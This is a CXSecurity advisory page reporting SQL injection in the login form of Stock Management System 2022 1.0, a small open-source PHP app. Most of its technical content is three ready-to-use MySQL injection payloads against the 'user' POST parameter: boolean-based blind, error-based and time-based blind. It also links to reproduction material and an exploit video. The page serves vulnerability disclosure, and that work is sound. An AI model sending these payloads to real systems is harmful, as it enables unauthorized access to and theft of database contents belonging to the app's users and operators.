---
title: Stock Management System 2022 1.0 From Erick Cesar SQL Injection
url: https://cxsecurity.com/issue/WLB-2022120045
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-25
fetch_date: 2025-10-04T02:28:28.069051
---

# Stock Management System 2022 1.0 From Erick Cesar SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Stock Management System 2022 1.0 From Erick Cesar SQL Injection** **2022.12.24**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: Stock-Management-System-2022-1.0-from-Erick-Cesar Multiple SQLi
## Author: nu11secur1ty
## Date: 12.22.2022
## Vendor: https://github.com/rickxy/Stock-Management-System
## Software: https://github.com/rickxy/Stock-Management-System
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/rickxy/2022/Stock-Management-System-1.0
## Description:
The `user` parameter appears to be vulnerable to SQL injection attacks.
The payload ' was submitted in the user parameter, and a database
error message was returned.
The attacker can still all information for the system by using this
vulnerability.
## STATUS: HIGH Vulnerability - CRITICAL
[+] Payload:
```MySQL
---
Parameter: user (POST)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY
or GROUP BY clause
Payload: user=bqxDgfIK' RLIKE (SELECT (CASE WHEN (8457=8457) THEN
0x627178446766494b ELSE 0x28 END)) AND
'BTvs'='BTvs&password=s9U!o7d!C0&btnlogin=
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or
GROUP BY clause (FLOOR)
Payload: user=bqxDgfIK' AND (SELECT 5004 FROM(SELECT
COUNT(\*),CONCAT(0x7178767071,(SELECT
(ELT(5004=5004,1))),0x7171707a71,FLOOR(RAND(0)\*2))x FROM
INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) AND
'aQfu'='aQfu&password=s9U!o7d!C0&btnlogin=
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: user=bqxDgfIK' AND (SELECT 8137 FROM
(SELECT(SLEEP(7)))nCyy) AND 'vQsi'='vQsi&password=s9U!o7d!C0&btnlogin=
---
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/rickxy/2022/Stock-Management-System-1.0)
## Proof and Exploit:
[href](https://streamable.com/gg7pyf)
## Time spent
`00:05:00`
## Writing an exploit
`00:05:00`

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120045)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top